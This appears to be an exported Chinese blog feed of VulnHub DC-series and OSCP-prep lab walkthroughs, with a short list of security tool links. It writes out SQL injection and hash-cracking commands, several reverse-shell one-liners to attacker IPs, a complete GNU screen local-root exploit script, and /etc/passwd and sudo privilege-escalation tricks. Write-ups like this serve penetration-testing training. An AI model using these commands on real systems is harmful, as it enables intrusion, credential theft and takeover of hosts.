<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.158.160/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.158.160/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -p list[fullordering] --batch --tables</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.158.160/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot;  -T &quot;#__users&quot; --columns  -p list[fullordering]</span><br></pre></td></tr></table></figure>

<p>爆出密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.158.160/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot;  -T &quot;#__users&quot; -C &quot;name,password,username&quot;  -p list[fullordering] --dump</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230708193816.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john 1.txt 解密md5</span><br></pre></td></tr></table></figure>

<p>账户：admin 密码：snoopy</p>
<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230708194932.png"></p>
<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230708195019.png"></p>
<p>getshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.158.160/templates/beez3/zhou.php</span><br></pre></td></tr></table></figure>

<p>老规矩，弹到msf中，但msf还是没有建议</p>
<p>suid 也用不了啥</p>
<h3 id="linux-版本提权"><a href="#linux-版本提权" class="headerlink" title="linux 版本提权"></a>linux 版本提权</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/issue  //获取linux 版本号</span><br></pre></td></tr></table></figure>

<p>Ubuntu 16.04 LTS \n \l</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit buntu 16.04</span><br><span class="line">searchsploit -p 39772.txt</span><br></pre></td></tr></table></figure>

<p>Linux Kernel 4.4.0 (Ubuntu 14.04&#x2F;16.04 x86-64) - ‘AF_PACKET’ Race Condition Privilege Escalation</p>
<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230708204253.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/linux/local/39772.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/p4sschen/ubuntu16-39772.zip-exp</span><br></pre></td></tr></table></figure>

<p>由于原来的payload已经被删除，这是搜到的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unzip 39772.zip    解压39772.zip文件</span><br><span class="line">cd 39772             到39772目录下</span><br><span class="line">tar xvf exploit.tar    解压exploit.tar，发现ebpf_mapfd_doubleput_exploit目录</span><br><span class="line">cd ebpf_mapfd_doubleput_exploit   到该目录下，发现compile.sh文件</span><br><span class="line">chmod +x compile.sh     给sh文件赋权</span><br><span class="line">./compile.sh    执行sh文件</span><br><span class="line">ls              查看，发现是由gcc编译的.c文件</span><br><span class="line">./doubleput     执行.c文件</span><br></pre></td></tr></table></figure>



<h2 id="dc-4"><a href="#dc-4" class="headerlink" title="dc-4"></a>dc-4</h2><p>bp 爆破</p>
<p>账号admin密码happy</p>
<p>反弹shelll</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">radio=nc+192.168.158.129+12345+-e+/bin/bash&amp;submit=Run</span><br></pre></td></tr></table></figure>

<p>切换终端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<p>在jim 备份文件下发现密码</p>
<p>ssh 爆破一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l jim -P 1.txt -I -t 64 ssh://192.168.158.163</span><br></pre></td></tr></table></figure>

<p>解密为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jibril04</span><br></pre></td></tr></table></figure>

<p>sudo -l 发现用不了,查看mbox,发现邮箱提示，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/mail</span><br><span class="line">cat jim 发现charles 的密码</span><br></pre></td></tr></table></figure>

<h3 id="teehee"><a href="#teehee" class="headerlink" title="teehee"></a>teehee</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;admin::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br><span class="line">参数解释</span><br><span class="line">#如：admin:x:0:0::/home/admin:/bin/bash</span><br><span class="line">#[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]</span><br><span class="line">&quot;-a&quot; 选项的作用等同于 &quot;&gt;&gt;&quot; 命令</span><br><span class="line">超级用户 UID=0 root</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su admin 即可</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/../06/bugku/QQ%E6%88%AA%E5%9B%BE20230714151401.png"></p>
<h2 id="dc-5"><a href="#dc-5" class="headerlink" title="dc-5"></a>dc-5</h2><p>文件包含，日志包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.158.129 7777</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">存在screen-4.5.0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit -p 41154.sh  //查看漏洞位置</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230714234229.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># screenroot.sh</span><br><span class="line"># setuid screen v4.5.0 local root exploit</span><br><span class="line"># abuses ld.so.preload overwriting to get root.</span><br><span class="line"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span><br><span class="line"># HACK THE PLANET</span><br><span class="line"># ~ infodox (25/1/2017)</span><br><span class="line">echo &quot;~ gnu/screenroot ~&quot;</span><br><span class="line">echo &quot;[+] First, we create our shell and library...&quot;</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so...</span><br><span class="line">/tmp/rootshell  </span><br></pre></td></tr></table></figure>

<p>为第一个文件名为libhax.c</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于，靶机上没有gcc环境这里选择在kali 上编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br></pre></td></tr></table></figure>

<p>第二个文件名为rootshell.c 内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure>

<p>第三个文件名为 run.sh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so...</span><br><span class="line">/tmp/rootshell </span><br></pre></td></tr></table></figure>

<p>遇见了这个报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tmp/rootshell: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34&#x27; not found (required by /tmp/rootshell)</span><br></pre></td></tr></table></figure>

<p>明天再搞</p>
<h2 id="dc-6"><a href="#dc-6" class="headerlink" title="dc-6"></a>dc-6</h2><p>和dc-2 一样需要设置hosts</p>
<p>打开扫描一下，发现</p>
<p>枚举用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy -e</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">mark</span><br><span class="line">graham</span><br><span class="line">sarah</span><br><span class="line">jens</span><br></pre></td></tr></table></figure>

<p>将这些用户名保存为账号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy/ -U users.txt -P passwords.txt</span><br></pre></td></tr></table></figure>

<p>获得密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名：mark</span><br><span class="line">密码：helpdesk01</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.158.129 4444</span><br></pre></td></tr></table></figure>

<p>弹出来shell之后，切换终端，在mark用户下发现文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Add new user: graham - GSo7isUM1D4 - done</span><br></pre></td></tr></table></figure>

<p>像是用户密码</p>
<p>ssh <a href="mailto:&#x67;&#114;&#97;&#x68;&#97;&#109;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#x2e;&#x31;&#x35;&#x38;&#46;&#49;&#57;&#x33;">&#x67;&#114;&#97;&#x68;&#97;&#109;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#x2e;&#x31;&#x35;&#x38;&#46;&#49;&#57;&#x33;</a> 登录 sudo -l</p>
<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230722173907.png"></p>
<p>这个用户有这个文件权限</p>
<h2 id="namp-提权"><a href="#namp-提权" class="headerlink" title="namp 提权"></a>namp 提权</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt;&gt; backups.sh</span><br><span class="line">sudo -u jens ./backups.sh</span><br><span class="line">切换用户</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;os.execute(&quot;/bin/bash&quot;)&#x27; &gt;zhou.nse</span><br><span class="line">sudo -u root nmap --script=zhou.nse</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230722175415.png"></p>
<h2 id="dc-7"><a href="#dc-7" class="headerlink" title="dc-7"></a>dc-7</h2><p>wapplayzer 识别是drupal 8 cms ,那么用之前的的脚本就打不了了</p>
<p>@DC7USER搜索一下，发现github能搜索到源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$servername = &quot;localhost&quot;;</span><br><span class="line">	$username = &quot;dc7user&quot;;</span><br><span class="line">	$password = &quot;MdR3xOgB7#dW&quot;;</span><br><span class="line">	$dbname = &quot;Staff&quot;;</span><br><span class="line">	$conn = mysqli_connect($servername, $username, $password, $dbname);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>直接ssh 连接发现能连接的上，但没有sudo -l 命令</p>
<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230724160925.png"></p>
<p>一个文件 &#x2F;opt&#x2F;scripts&#x2F;backups.sh</p>
<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230724164057.png"></p>
<p>发现drush<a href="https://zhuanlan.zhihu.com/p/60880048">Drupal drush 常用命令 - 知乎 (zhihu.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/www/html/ </span><br><span class="line">drush user-password admin --password=&quot;123456&quot; </span><br></pre></td></tr></table></figure>

<p>修改admin 的密码为123456</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -l /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure>

<p>查看文件详细信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-rwxrwxr-x 1 root www-data 520 Aug 29  2019 /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure>

<p>所属于root 和www-data 所以使用蚁剑就能够写入内容从而进行提权，由于该用户没有写入权限，开始打web</p>
<p>进入后台后，发现没有PHP插件，安装php 编译器</p>
<p>安装过程如大佬写的那样，不多赘述</p>
<p>反弹shell </p>
<h3 id="nc无e参数反弹shell"><a href="#nc无e参数反弹shell" class="headerlink" title="nc无e参数反弹shell"></a>nc无e参数反弹shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.158.120 7878 &gt;/tmp/f</span><br></pre></td></tr></table></figure>

<p>发现弹出来的还是www-data 后来才知道，需要等15分钟后就成的</p>
<p>get root<img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230724220849.png"></p>
<p>下班</p>
<h2 id="dc-8"><a href="#dc-8" class="headerlink" title="dc-8"></a>dc-8</h2><p>sqlmap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://192.168.158.196/?nid=1 --batch -D d7db -T users -C name,pass,uid --dump</span><br></pre></td></tr></table></figure>

<p>john</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF</span><br></pre></td></tr></table></figure>

<p>cat &#x2F;home&#x2F;zhou&#x2F;.john&#x2F;john.pot # 查看john 破解过的密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">turtle</span><br></pre></td></tr></table></figure>

<p>登录</p>
<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230727141533.png"></p>
<p>，然后随便写提交</p>
<p>msf接受shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230727141714.png"></p>
<p>发现exim4</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit exim4</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload /usr/share/exploitdb/exploits/linux/local/46996.sh /tmp/shell.sh</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./shell.sh -m netcat</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230727152125.png"></p>
<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230727152254.png"></p>
]]></content>
      <tags>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>linux工具</title>
    <url>/2023/07/08/linux%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p> 慢慢写</p>
<span id="more"></span>

<h2 id="passwarekit"><a href="#passwarekit" class="headerlink" title="passwarekit"></a>passwarekit</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.downkuai.com/soft/137912.html</span><br></pre></td></tr></table></figure>

<h2 id="terimus"><a href="#terimus" class="headerlink" title="terimus"></a>terimus</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ddooo.com/softdown/182046.htm</span><br></pre></td></tr></table></figure>

<h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><p>docker复现题目</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.docker build命令用于从Dockerfile构建映像。可以在docker build命令中使用-f标志指向文件系统中任何位置的Dockerfile。</span><br><span class="line">docker build -f /path/to/a/Dockerfile</span><br></pre></td></tr></table></figure>

<p>docker-compose使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd flask/ssti</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>



<h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/shadow1ng/fscan/releases/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd fscan//进入fscan文件夹</span><br><span class="line"></span><br><span class="line">//执行在windows下为fscan.exe,linux下为./fscan</span><br><span class="line"></span><br><span class="line">//例如</span><br><span class="line">./fscan -h 192.168.101.1/24//启动fscan并扫描网段</span><br><span class="line"></span><br><span class="line">fscan.exe -h 192.168.x.x //默认使用全部模块</span><br><span class="line">fscan.exe -h 192.168.x.x -rf id_rsa.pub //redis 写私钥</span><br><span class="line">fscan.exe -h 192.168.x.x -c whoami //ssh爆破成功后，命令执行</span><br><span class="line">fscan.exe -h 192.168.x.x -m ms17010 //指定模块</span><br><span class="line">fscan.exe -h 192.168.x.x -m ssh -p 2222 //指定模块ssh和端口</span><br><span class="line">fscan.exe -h 192.168.x.x -h 192.168.1.1/24 //C段</span><br><span class="line">fscan.exe -h 192.168.x.x -h 192.168.1.1/16 //B段</span><br><span class="line">fscan.exe -h 192.168.x.x -h 192.168.1.1/8  //A段的192.x.x.1和192.x.x.254,方便快速查看网段信息</span><br><span class="line">fscan.exe -h 192.168.x.x -hf ip.txt //以文件导入</span><br></pre></td></tr></table></figure>

<h1 id="burpsuite-IP伪造插件fakeIP【下载安装及使用】"><a href="#burpsuite-IP伪造插件fakeIP【下载安装及使用】" class="headerlink" title="burpsuite IP伪造插件fakeIP【下载安装及使用】"></a>burpsuite IP伪造插件fakeIP【下载安装及使用】</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://gitcode.net/mirrors/TheKingOfDuck/burpFakeIP?utm_source=csdn_github_accelerator</span><br></pre></td></tr></table></figure>

<h2 id="php源码混淆类加密"><a href="#php源码混淆类加密" class="headerlink" title="php源码混淆类加密"></a>php源码混淆类加密</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.zhaoyuanma.com/phpjm.html</span><br></pre></td></tr></table></figure>

<h2 id="IP域名存活探测工具-Web-SurvivalScan"><a href="#IP域名存活探测工具-Web-SurvivalScan" class="headerlink" title="IP域名存活探测工具-Web-SurvivalScan"></a>IP域名存活探测工具-Web-SurvivalScan</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/AabyssZG/Web-SurvivalScan</span><br></pre></td></tr></table></figure>

<h2 id="thinkphpgui"><a href="#thinkphpgui" class="headerlink" title="thinkphpgui"></a>thinkphpgui</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/bewhale/thinkphp_gui_tools/releases</span><br></pre></td></tr></table></figure>

<h2 id="dockstation-docker-Gui"><a href="#dockstation-docker-Gui" class="headerlink" title="dockstation docker Gui"></a>dockstation docker Gui</h2><p><a href="https://dockstation.io/">DockStation - Developing with Docker has never been so easy and convenient</a></p>
<h2 id="apt源"><a href="#apt源" class="headerlink" title="apt源"></a>apt源</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>oscp1</title>
    <url>/2023/07/28/oscp1/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="Gaara"><a href="#Gaara" class="headerlink" title="Gaara"></a>Gaara</h2><p>&#x2F;iamGaara</p>
<p>发现类似用户名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l gaara -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.59</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230728171600.png"></p>
<p>账号密码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><a href="https://gtfobins.github.io/gtfobins/gdb/">gdb | GTFOBins</a></p>
<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230728174612.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb -nx -ex &#x27;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quit</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230728174709.png"></p>
<h2 id="vegeta"><a href="#vegeta" class="headerlink" title="vegeta"></a>vegeta</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/robots.txt</span><br></pre></td></tr></table></figure>

<p>发现&#x2F;find_me访问find_me&#x2F;find_me.html，查看源码，发现base64 加密，</p>
<p>解密之后随波逐流转图片<a href="https://tuzim.net/decode/">在线二维码识别,二维码解码 - 兔子二维码 (tuzim.net)</a>识别</p>
<p>后</p>
<p>Password : topshellv</p>
<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230807011640.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -r -u http://192.168.1.58/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100 -e</span><br></pre></td></tr></table></figure>

<p>&#x2F;bulma ，是一段音频音频在线解密网站</p>
<p><a href="https://morsecode.world/international/decoder/audio-decoder-expert.html">Morse Code Audio Decoder | Morse Code World</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">U S E R : T R U N K S P A S S W O R D : U S 3 R ( S I N D O L L A R S S Y M B O L )</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户 trunks 密码 u$3r</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat .bash_history</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -l /etc/passwd</span><br><span class="line">-rw-r--r-- 1 trunks root 1486 Jun 28  2020 /etc/passwd</span><br></pre></td></tr></table></figure>

<p>发现也同时属于当前用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt zhou zhou</span><br><span class="line">$1$zhou$IY3SDlxhR.gde5eP6C/Y/0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p>将root换为zhou x 换为解密后的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;zhou:$1$zhou$IY3SDlxhR.gde5eP6C/Y/0:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>

<p>写入即可</p>
<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230807020701.png"></p>
<p>这个靶机比较容易</p>
<h2 id="infosec"><a href="#infosec" class="headerlink" title="infosec"></a>infosec</h2><p>下载地址<a href="https://www.vulnhub.com/entry/infosec-prep-oscp,508/">InfoSec Prep: OSCP ~ VulnHub</a></p>
<p>扫描靶机ip 访问robots.txt 发现&#x2F;secret.txt</p>
<p>访问，看到base64 ,解密后发现是私钥</p>
<p>保存为名字 2 赋于权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 700 2</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh  oscp@192.168.56.106 -i 2</span><br></pre></td></tr></table></figure>

<p>suid 提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -exec ls -al &#123;&#125; \; 2&gt; /dev/null</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/bash -p</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230807192439.png"></p>
<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230807192518.png"></p>
<h2 id="INCLUSIVENESS"><a href="#INCLUSIVENESS" class="headerlink" title="INCLUSIVENESS"></a>INCLUSIVENESS</h2><p>靶机下载地址</p>
<p><a href="https://www.vulnhub.com/entry/inclusiveness-1,422/">inclusiveness: 1 ~ VulnHub</a></p>
<p>访问robots.txt ，You are not a search engine! You can’t read my robots.txt!</p>
<p>。我们可以修改我们的数据包UA头来绕过检测。（Googlebot是谷歌爬虫）</p>
<p>&#x2F;secret_information</p>
<p>secret_information&#x2F;?lang&#x3D;&#x2F;etc&#x2F;passwd</p>
<p>存在文件包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.56.111 -p- -sV -A </span><br></pre></td></tr></table></figure>

<p>发现ftp服务，匿名登陆</p>
<p>anonymous （匿名的）</p>
<p>当前目录没有写入权限cd pub下有写入权限</p>
<p>put shell.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">system(&#x27;sh -i &gt;&amp; /dev/tcp/192.168.56.105/5000 0&gt;&amp;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>文件包含 &#x2F;secret_information&#x2F;?lang&#x3D;&#x2F;var&#x2F;ftp&#x2F;pub&#x2F;shell.php</p>
<p>但是由于弹不出来，所以，写个马进去，文件包含</p>
